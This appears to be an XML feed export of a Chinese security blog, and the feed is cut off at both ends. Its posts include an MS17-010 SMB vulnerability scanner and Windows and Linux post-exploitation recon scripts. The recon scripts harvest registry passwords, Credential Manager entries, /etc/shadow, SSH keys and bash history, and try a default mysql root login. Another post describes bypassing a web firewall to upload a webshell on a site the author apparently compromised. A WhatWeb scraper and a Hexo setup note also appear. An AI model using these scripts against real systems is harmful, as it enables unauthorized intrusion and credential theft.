sysuser=input(&#39;IP:&#39;)def scan():payload0 = binascii.unhexlify (&#39;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&#39;)payload1 = binascii.unhexlify(&#39;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&#39;)payload2 = binascii.unhexlify(&#39;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&#39;)payload3 = binascii.unhexlify(&#39;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&#39;)s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.settimeout(5)host=userport=445s.connect((host,port))print(&#39;[+]{}Ready to send&#39;.format(host))s.send(payload0)s.recv(1024)print(&#39;[+]{}Setting request&#39;.format(host))s.send(payload1)session_setup_response=s.recv(1024)user_id=session_setup_response[32:34]print(host,&#39;User ID=%s&#39;%struct.unpack(&#39;&lt;H&#39;,user_id)[0])modified_tree_connect_request=list(payload2)modified_tree_connect_request[32]=user_id[0]modified_tree_connect_request[33]=user_id[1]modified_tree_connect_request=&quot;&quot;.join(&#39;%s&#39;%ld for ld in modified_tree_connect_request)print(&#39;[+]{}Send connection&#39;.format(host))s.send(payload2)tree_connect_response=s.recv(1024)tree_id=tree_connect_response[28:30]print(&#39;[+]{}&#39;.format(host),&#39;Tree ID=%s&#39;%struct.unpack(&#39;&lt;H&#39;,tree_id)[0])modified_trans2_session_setup=list(payload3)modified_trans2_session_setup[28]=tree_id[0]modified_trans2_session_setup[29]=tree_id[1]modified_trans2_session_setup[32]=user_id[0]modified_trans2_session_setup[33]=user_id[1]modified_trans2_session_setup=&quot;&quot;.join(&#39;{}&#39;.format(li for li in modified_trans2_session_setup))print(&#39;[+]{}Sending success is actually returning.&#39;.format(host))s.send(payload3)final_respone=s.recv(1024)s.close()if final_respone[32]==&quot;\x51&quot;:    print(&#39;[*]existence MS17-010&#39;)else:    print(&#39;[-]Not existence MS17-010&#39;)def run():    scan()run()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/UuZtBJw.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows提权辅助脚本</title>
      <link href="/posts/d121753b.html"/>
      <url>/posts/d121753b.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>进入到后渗透阶段就涉及到了提权。提权的第一步是信息收集，所以这个脚本因此而诞生。当然Demon哥分享的干货是够干的</p><p><img src="https://i.imgur.com/VJFPdww.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>windows提权用到的命令：</p><pre><code>systeminfonet usernet user user1ipconfig /allroute printarp -Anetstat -anonetsh firewall show stateschtasks /query /fo LIST /vtasklist /SVCnet startDRIVERQUERYwmic qfe get Caption,Description,HotFixID,InstalledOnwmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;sc qc Spooler</code></pre><p>等等之类的</p><p>代码：</p><pre><code>import osdef collect():    xj=open(&#39;save.txt&#39;,&#39;w&#39;)    xj.close()    print(&#39;[+]什么是操作系统和架构？它缺少任何补丁吗？&#39;)    systeminfo=os.popen(&#39;systeminfo&#39;)    wmic_qfe=os.popen(&#39;wmic qfe&#39;)    for s in systeminfo:        print(s,file=open(&#39;save.txt&#39;,&#39;a&#39;))    for c in wmic_qfe:        print(c,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]环境变量有什么有趣的吗？域控制器在LOGONSERVER？&#39;)    set=os.popen(&#39;set&#39;)    #Get_chiditem=os.popen(&#39;Get-ChildItem Env: | ft Key,Value&#39;)    for e in set:        print(e,file=open(&#39;save.txt&#39;,&#39;a&#39;))    #for t in Get_chiditem:        #print(t,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]还有其他连接的驱动器吗？&#39;)    net_use=os.popen(&#39;net use&#39;)    wmic_log=os.popen(&#39;wmic logicaldisk get caption,description,providername&#39;)    #psd=os.popen(&#39;Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root&#39;)    for ne in net_use:        print(ne,file=open(&#39;save.txt&#39;,&#39;a&#39;))    for g in wmic_log:        print(g,file=open(&#39;save.txt&#39;,&#39;a&#39;))    #for d in psd:        #print(d,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]你是谁？&#39;)    whoami=os.popen(&#39;whoami&#39;)    username=os.popen(&#39;echo %USERNAME%&#39;)    for whoa in whoami:        print(whoa,file=open(&#39;save.txt&#39;,&#39;a&#39;))    for m in username:        print(m,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]任何有趣的用户权限？注意：“状态”列并不表示用户具有或无权访问此权限。如果列出了该权限，则该用户拥有该权限。&#39;)    priv=os.popen(&#39;whoami /priv&#39;)    for i in priv:        print(i,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]用户在系统上有什么用途？任何未清理的旧用户配置文件？&#39;)    ur=os.popen(&#39;net users&#39;)    bw=os.popen(&#39;dir /b /ad &quot;C:/Users/&quot;&#39;)    #bs=os.popen(&#39;dir /b /ad &quot;C:/Documents and Settings/&quot; # Windows XP and below&#39;)    for r in ur:        print(r,file=open(&#39;save.txt&#39;,&#39;a&#39;))        for w in bw:            print(w,file=open(&#39;save.txt&#39;,&#39;a&#39;))            #for s in bs:                #print(s,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]还有其他人登录吗？&#39;)    qwinsta=os.popen(&#39;qwinsta&#39;)    for w in qwinsta:        print(w,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]系统上有哪些组？&#39;)    net_localgroup=os.popen(&#39;net localgroup&#39;)    for group in net_localgroup:        print(group,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]Administrators组中是否有任何用户？&#39;)    net_localgroup_Administrators=os.popen(&#39;net localgroup Administrators&#39;)    for administrator in net_localgroup_Administrators:        print(administrator,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]用户自动登录注册表中的任何内容？&#39;)    reg_query=os.popen(&#39;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;&#39;)    for v in reg_query:        print(v,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]在Credential Manager中有什么有趣的东西吗？&#39;)    cmdkey_list=os.popen(&#39;cmdkey /list&#39;)    for l in cmdkey_list:        print(l,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]cmdkey /list我们可以访问SAM和SYSTEM文件吗？&#39;)    lg=[&#39;%SYSTEMROOT%/repair/SAM&#39;,&#39;%SYSTEMROOT%/System32/config/RegBack/SAM&#39;,&#39;%SYSTEMROOT%/System32/config/SAM&#39;,&#39;%SYSTEMROOT%/repair/system&#39;,&#39;%SYSTEMROOT%/System32/config/SYSTEM&#39;,&#39;%SYSTEMROOT%/System32/config/RegBack/system&#39;]    for k in lg:        system=os.popen(k)        for q in system:            print(q,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]安装了什么软件？&#39;)    rj=[&#39;dir /a &quot;C:\Program Files&quot;&#39;,&#39;dir /a &quot;C:\Program Files (x86)&quot;&#39;,&#39;reg query HKEY_LOCAL_MACHINE\SOFTWARE&#39;]    for j in rj:        qw=os.popen(j)        for w in qw:            print(w,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]程序文件夹中每个人或用户的完全权限？&#39;)    icacls=[&#39;icacls &quot;C:\Program Files\*&quot; 2&gt;nul&#39;,&#39;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul&#39;,&#39;icacls &quot;C:\Program Files\*&quot; 2&gt;nul &#39;,&#39;icacls &quot;C:\Program Files (x86)\*&quot;&#39;]    for aw in icacls:        qdw=os.popen(aw)        for rs in qdw:            print(rs,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]系统上正在运行的进程/服务是什么？内部服务没有暴露吗？如果是这样，我们可以打开它吗？&#39;)    tasklist=[&#39;tasklist /svc&#39;,&#39;tasklist /v&#39;,&#39;net start&#39;,&#39;sc query&#39;,]    for t in tasklist:        wx=os.popen(t)        for p in wx:            print(p,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]有没有不带引号的服务路径？&#39;)    wmcs=os.popen(&#39;wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;&#39;)    for m in wmcs:        print(m,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]那里有什么预定的任务？什么定制实施？&#39;)    xw=os.popen(&#39;schtasks /query /fo LIST 2&gt;nul | findstr TaskName&#39;)    print(xw,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]启动时跑了什么？&#39;)    qz=[&#39;wmic startup get caption,command&#39;,&#39;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run&#39;,&#39;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;,&#39;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run&#39;,&#39;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;,&#39;dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;&#39;,&#39;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;&#39;]    for z in qz:        xq=os.popen(z)        for r in xq:            print(r,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]连接了哪些NIC？有多个网络吗？&#39;)    ipconfig_all=os.popen(&#39;ipconfig /all&#39;)    for all in ipconfig_all:        print(all,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]我们有什么路线？&#39;)    xpo=os.popen(&#39;route print&#39;)    for o in xpo:        print(o,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]ARP缓存中的任何内容？&#39;)    arp=os.popen(&#39;arp -a&#39;)    for p in arp:        print(p,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]是否有与其他主机的连接？&#39;)    sw=os.popen(&#39;netstat -ano&#39;)    for b in sw:        print(b,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]防火墙是否已打开？如果是这样配置的是什么？&#39;)    fq=[&#39;netsh firewall show state&#39;,&#39;netsh firewall show config&#39;,&#39;netsh advfirewall firewall show rule name=all&#39;,&#39;netsh advfirewall export &quot;firewall.txt&quot;&#39;]    for u in fq:        fhq=os.popen(u)        for f in fhq:            print(f,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]还有其他有趣的界面配置吗？&#39;)    netsh_dump=os.popen(&#39;netsh dump&#39;)    for ump in netsh_dump:        print(ump,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]注册表中的任何密码？&#39;)    lv=[&#39;reg query HKCU /f password /t REG_SZ /s&#39;,&#39;reg query HKLM /f password /t REG_SZ /s &#39;]    for pasw in lv:        passwd=os.popen(pasw)        for pd in passwd:            print(pd,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]是否有可用的sysprep或无人值守文件？&#39;)    zi=os.popen(&#39;dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul&#39;)    for nb in zi:        print(nb,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;[+]有待观察的有趣文件吗？可能在用户目录（桌面，文档等）中？&#39;)    sl=os.popen(&#39;dir /s *pass* == *vnc* == *.config* 2&gt;nul&#39;)    for lw in sl:        print(lw,file=open(&#39;save.txt&#39;,&#39;a&#39;))    print(&#39;&#39;)    print(&#39;&#39;)    print(&#39;[*]判断是否存在以下路径&#39;)    lss=[]    if os.path.exists(&#39;list.txt&#39;):        print(&#39;[+]存在list.txt&#39;)    else:        print(&#39;[-]不存在list.txt&#39;)        exit()    dk=open(&#39;list.txt&#39;,&#39;r&#39;)    for r in dk.readlines():        qk=&quot;&quot;.join(r.split(&#39;\n&#39;))        lss.append(qk)    for g in lss:        if os.path.exists(g):            print(&#39;[+]存在 {}&#39;.format(g))        else:            print(&#39;[-]不存在{}&#39;.format(g))collect()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/tpS2Tob.png" alt=""></p><p><img src="https://i.imgur.com/3KobSkD.png" alt=""></p><p>收集到的信息会写入save.txt<br>save.txt的结果：<a href="https://paste.ubuntu.com/p/dR5QGJBHY2/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/dR5QGJBHY2/</a></p><p>关于提权的两篇文章：</p><pre><code>http://www.fuzzysecurity.com/tutorials/16.htmlhttps://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</code></pre><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫抓取whatweb接口</title>
      <link href="/posts/6aba04f9.html"/>
      <url>/posts/6aba04f9.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前一直想抓whatweb的接口。但是明明写的没有毛病，就是抓不了今天不死心的在写了一次。发现了问题的所在</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=453413076,2870052388&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>什么是whatweb？</strong></p><pre><code>什么是WhatWeb？WhatWeb识别网站。它的目标是回答“这是什么网站？”的问题。WhatWeb可识别Web技术，包括内容管理系统（CMS），博客平台，统计/分析包，JavaScript库，Web服务器和嵌入式设备。WhatWeb拥有超过1700个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。WhatWeb可以隐秘，快速，或彻底但缓慢。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当您在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“隐身”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。开发了更积极的模式用于渗透测试。大多数WhatWeb插件都是彻底的，并且可以识别从微妙到显而易见的一系列线索。例如，大多数WordPress网站可以通过元HTML标签识别，例如&#39;&#39;，但少数WordPress网站删除了这个识别标签，但这并不妨碍WhatWeb。WordPress WhatWeb插件有超过15个测试，包括检查favicon，默认安装文件，登录页面，以及检查相对链接中的“/ wp-content /”。</code></pre><p><strong>whatweb在线检测地址：</strong><br><a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a></p><p>基本操作抓包：<br><img src="https://i.imgur.com/HVLhIyA.png" alt=""></p><p>从图中可以看见请求参数为<strong>target</strong><br>然后正常的写一个headers，然后用requests进行post请求应该就是这样吧= =很遗憾的是，这样子什么也不会返回。后来我看了一下<strong>控制台</strong>才发现原因。</p><p><img src="https://i.imgur.com/Q7prpQN.png" alt=""></p><p>图中的意思是，没有<strong>Console</strong>和<strong>Content-length</strong>头拒绝进行识别，后面抱着半信半疑的进行了测试发现居然可以了<br>代码：</p><pre><code>#-*-coding:&#39;utf-8&#39;-*-#name:九世#time:2018-8-8-20:58import requestsfrom bs4 import BeautifulSoupdef whatweb():    banner=&#39;&#39;&#39; ____  __.__.__  .__                |    |/ _|__|  | |  |  __ _______   |      &lt; |  |  | |  | |  |  \__  \  |    |  \|  |  |_|  |_|  |  // __ \_|____|__ \__|____/____/____/(____  /        \/                       \/ &#39;&#39;&#39;    print(banner)    user=input(&#39;Domain name to be querying:&#39;)    headers={&#39;user-agent&#39;:&#39;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&#39;,             &#39;Content-length&#39;:&#39;20&#39;,             &#39;Connection&#39;:&#39;keep-alive&#39;}    data={&#39;target&#39;: &#39;{}&#39;.format(user)}    url=&#39;https://www.whatweb.net/&#39;    reqts=requests.post(url=url,headers=headers,data=data)    dw=BeautifulSoup(reqts.text,&#39;html.parser&#39;)    for p in dw.find_all(&#39;pre&#39;):        print(p.get_text())def jy2():    banner = &#39;&#39;&#39; ____  __.__.__  .__                    |    |/ _|__|  | |  |  __ _______       |      &lt; |  |  | |  | |  |  \__  \      |    |  \|  |  |_|  |_|  |  // __ \_    |____|__ \__|____/____/____/(____  /            \/                       \/ &#39;&#39;&#39;    print(banner)    user = input(&#39;file:&#39;)    dk=open(&#39;{}&#39;.format(user),&#39;r&#39;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&#39;\n&#39;))        headers = {            &#39;user-agent&#39;: &#39;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&#39;,            &#39;Content-length&#39;: &#39;20&#39;,            &#39;Connection&#39;: &#39;keep-alive&#39;}        data = {&#39;target&#39;: &#39;{}&#39;.format(qc)}        url = &#39;https://www.whatweb.net/&#39;        reqts = requests.post(url=url, headers=headers, data=data)        dw = BeautifulSoup(reqts.text, &#39;html.parser&#39;)        for p in dw.find_all(&#39;pre&#39;):            print(p.get_text())print(&#39;[1] 单个域名&#39;)print(&#39;[2] 批量导入&#39;)xw=input(&#39;xz=&gt;:&#39;)if xw==&#39;1&#39;:    whatweb()elif xw==&#39;2&#39;:    jy2()</code></pre><p>两个功能，一个单检测，一个批量导入进行检测。<br>测试图如下：</p><p><img src="https://i.imgur.com/xZyzBvT.png" alt=""></p><p><img src="https://i.imgur.com/pDIc0Yl.png" alt=""></p><p>转载请声明：来自422926799.github.com</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过网站防火墙上传</title>
      <link href="/posts/c2257cfb.html"/>
      <url>/posts/c2257cfb.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前几天在搞站的时候，拿到了一个webshell。一开始还没有网站防火墙之类的东西，好像是一句话被管理员发现了。安了防火墙和360…360是恶心的一批的东西。</p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>其实方法很简单，注意看图，这是一开始普通上传没有做任何修改的<br>会被直接拦截<br><img src="https://i.imgur.com/L8tVoiA.png" alt=""></p><p>把图中所画的空格去掉，就能产生BUG导致上传成功。<br><img src="https://i.imgur.com/vpOPLpA.png" alt=""></p><p>上传成功<br><img src="https://i.imgur.com/tqNBsFZ.png" alt=""></p><p><img src="https://i.imgur.com/7pJXcKj.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一波三折的博客环境重新搭建</title>
      <link href="/posts/26807c00.html"/>
      <url>/posts/26807c00.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天该死的Ubuntu崩了。。。然后博客环境也没有了。W_W，百度各种办法发现无法恢复。后面干脆重新建一个，反正文章有备份。以后一定备份博客。。。喵了个咪的。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1325385962,3551867219&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先把仓库删除，安装Git，nodejs。然后在安装hexo</p><pre><code>git下载地址：https://git-scm.com/nodejs下载地址：https://nodejs.org/en/下载好后，各自安装</code></pre><p>在x盘创建一个目录，名为mylogo。然后进入其目录执行</p><pre><code>npm install -g hexonpm install hexo-deployer-git --save</code></pre><p>然后下载Cactus主题，进行替换更改。在进行创建新的分类</p><pre><code>hexo new page Writing</code></pre><p>修改_config.yml改名字等等之类的东西。在添加cactus的站内搜索功能</p><pre><code>hexo new page Searchnpm install hexo-generator-search --save进入source/Search目录，修改index.md,添加Search: true</code></pre><p>在将备份的文章放入source/_posts,在git bash创建ssh，然后将其放入github。执行hexo -d。执行之后发现</p><pre><code>ERROR Deployer not found: .git</code></pre><p>安装hexo-depoyer-git，将git添加其环境变量。进行电脑重启，执行git init,然后在执行hexo -d,在次执行hexo -d 发现一个警告为IP永久添加RSA秘钥之类的。打开host文件添加 </p><pre><code>“自己的IP” github.com</code></pre><p>之后在次执行发现</p><pre><code>warning: LF will be replaced by CRLF in xxxx</code></pre><p>解决方法：</p><pre><code>git config --global core.autocrlf false</code></pre><p>再次执行hexo -d，发现没有毛病了。再次，成功的把博客搭建好了。。。<br>这次没加2D模型。有人说太宅男了。</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux信息收集</title>
      <link href="/posts/8e06ab6b.html"/>
      <url>/posts/8e06ab6b.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。<br>很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张）<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路</strong>：</p><pre><code>0.首先要获取系统信息：系统名称本地ip主机名本地dns环境变量shell程序hosts文件路由信息arp缓存计划任务挂载磁盘mail目录history文件home/root/bin/sbin目录1.获取用户信息当前权限用户信息本地用户在线用户hash加密规则hash信息用户组信息最后登录信息最后登录用户信息所有用户的计划任务2.安全扫描是否能无密码sudoconf配置文件ssh的密钥文件是否能root登录敏感配置文件扫描关键字含有config、web.xml、database、pass的文件uid为0用户敏感服务匿名空密码用户zip/tar.gz/sh/pl/py/rb/txt/bak后缀文件3.全部命令放入一个列表里，说明放入一个列表里4.遍历写入</code></pre><p>代码：</p><pre><code>import osml=[&#39;uname -a&#39;,&#39;cat /etc/issue&#39;,&#39;hostname&#39;,&#39;cat /etc/hosts&#39;,&#39;who&#39;,&quot;awk -F &#39;:&#39; &#39;{print $1,$3,$4,$6;}&#39; /etc/passwd&quot;,&#39;cat /etc/group&#39;,&#39;cat /etc/shadow&#39;,&#39;grep -v -E &quot;^#&quot; /etc/passwd&#39;,&#39;cat ~/.bash_history&#39;,&#39;w&#39;,&#39;netstat&#39;,&#39;ps -aux&#39;,&#39;dpkg -l&#39;,&#39;netstat -antpu&#39;,&#39;arp -a&#39;,&#39;uname -a 2&gt;/dev/null&#39;,&#39;hostname&#39;,&#39;lastlog&#39;,&#39;for i in $(cat /etc/passwd 2&gt;/dev/null&#39;,&quot;grep -v &#39;^[^:]*:[x]&#39; /etc/passwd 2&gt;/dev/null&quot;,&#39;grep -v &quot;^#&quot; /etc/passwd&#39;,&#39;cat /etc/shadow 2&gt;/dev/null&#39;,&#39;cat /etc/master.passwd 2&gt;/dev/null&#39;,&#39;echo &#39;&#39;sudo -S -l 2&gt;/dev/null&#39;,&#39;ls -ahl /root/ 2&gt;/dev/null&#39;,&#39;ls -ahl /home/ 2&gt;/dev/null&#39;,&#39;find / -writable -not -user \`whoami\` -type f -not -path &quot;/proc/*&quot; -exec ls -al {} \; 2&gt;/dev/null&#39;,&#39;find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls&#39;,&#39;&#39;&#39;grep &quot;PermitRootLogin &quot; /etc/ssh/sshd_config 2&gt;/dev/null | grep -v &quot;#&quot; | awk &#39;{print  $2}&#39;&#39;&#39;,&#39;echo $PATH 2&gt;/dev/null&#39;,&#39;cat /etc/shells 2&gt;/dev/null&#39;,&#39;cat /etc/login.defs 2&gt;/dev/null | grep &quot;PASS_MAX_DAYS\|PASS_MIN_DAYS\|PASS_WARN_AGE\|ENCRYPT_METHOD&quot; 2&gt;/dev/null | grep -v &quot;#&quot; 2&gt;/dev/null&#39;,&#39;ls -la /etc/cron* 2&gt;/dev/null&#39;,&#39;cat /etc/crontab 2&gt;/dev/null&#39;,&#39;cat /etc/passwd | cut -d &quot;:&quot; -f 1 | xargs -n1 crontab -l -u 2&gt;/dev/null&#39;,&#39;cat /etc/resolv.conf 2&gt;/dev/null&quot;&#39;,&#39;route 2&gt;/dev/null&#39;,&#39;netstat -antp 2&gt;/dev/null&#39;,&#39;netstat -anup 2&gt;/dev/null&#39;,&#39;ps aux 2&gt;/dev/null&#39;,&quot;ps aux&quot;,&quot;&#39;ls -la /etc/init.d 2&gt;/dev/null&#39;&quot;,&quot;find /etc/init.d/ \! -uid 0 -type f 2&gt;/dev/null&quot;,&quot;mysql --version 2&gt;/dev/null&quot;,&quot;sudo -V 2&gt;/dev/null&quot;,&quot;mysqladmin -uroot -proot version 2&gt;/dev/null&quot;,&quot;psql -V 2&gt;/dev/null&quot;,&quot;apache2 -v 2&gt;/dev/null; httpd -v 2&gt;/dev/null&quot;,&quot;&quot;&quot;awk &#39;{sub(/.*\export /,&quot;&quot;)}1&quot;&quot;&quot;,&#39;ifconfig&#39;]shuomin=[&#39;内核(是否为x64还是x86)&#39;,&#39;版本&#39;,&#39;主机名&#39;,&#39;hosts&#39;,&#39;目前登录系统的用户信息&#39;,&#39;获取用户名&#39;,&#39;获取用户组&#39;,&#39;获取hash&#39;,&#39;列出超级用户&#39;,&#39;查看用户操作&#39;,&#39;获取在线用户&#39;,&#39;端口&#39;,&#39;进程&#39;,&#39;程序&#39;,&#39;敏感文件&#39;,&#39;交互通信的ip&#39;,&#39;arp缓存&#39;,&#39;基础内核信息&#39;,&#39;主机名&#39;,&#39;最后用户登录的信息&#39;,&#39;列出所有用户的组&#39;,&#39;查询是否有hash存储在/etc/passwd(*nix中)&#39;,&#39;根据uid列出本地用户&#39;,&#39;读取shadow文件&#39;,&#39;bsd的shadow文件&#39;,&#39;能够sudo不需要提供密码&#39;,&#39;检查root目录是否存在&#39;,&#39;显示home目录情况&#39;,&#39;寻找文件我们能写但是不属于我们的文件&#39;,&#39;寻找ssh公钥&#39;,&#39;root是否能登录ssh,如果返回yes则可以登录&#39;,&#39;环境变量&#39;,&#39;列出能用的shells&#39;,&#39;hash的密码加密政策&#39;,&#39;所有的计划任务配置文件&#39;,&#39;获取计划任务内容&#39;,&#39;获取每个用户的计划任务&#39;,&#39;dns设置&#39;,&#39;路由配置&#39;,&#39;正在监听的tcp端口&#39;,&#39;udp端口&#39;,&#39;正在运行的程序&#39;,&#39;查看进程路径和权限&#39;,&#39;获取inetd.conf文件(监视网络的守护进程)&#39;,&#39;列举各种服务的管理脚本&#39;,&#39;寻找不是root的&#39;,&#39;获取mysql版本&#39;,&#39;获取sudo版本&#39;,&#39;测试root/root能否登录&#39;,&#39;postgres版本&#39;,&#39;apache详情&#39;,&#39;apache的运行用户&#39;,&#39;ip&#39;]def poc():    xk = open(&#39;save.txt&#39;, &#39;w&#39;)    xk.close()    for i in range(0,len(ml)):        zx=os.popen(ml[i])        print(&#39;[+]{}&#39;.format(shuomin[i]))        print(&#39;[+]{}&#39;.format(shuomin[i]),file=open(&#39;save.txt&#39;,&#39;a&#39;))        for z in zx:            print(z,file=open(&#39;save.txt&#39;,&#39;a&#39;))poc()</code></pre><p>收集结果如下：<br><img src="https://i.imgur.com/F4QC5Cs.png" alt=""></p><p><img src="https://i.imgur.com/ap7NSAR.png" alt=""></p><p><img src="https://i.imgur.com/rNcTlqi.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dedecms远程文件写入漏洞检测</title>
      <link href="/posts/8284a757.html"/>
      <url>/posts/8284a757.html</url>
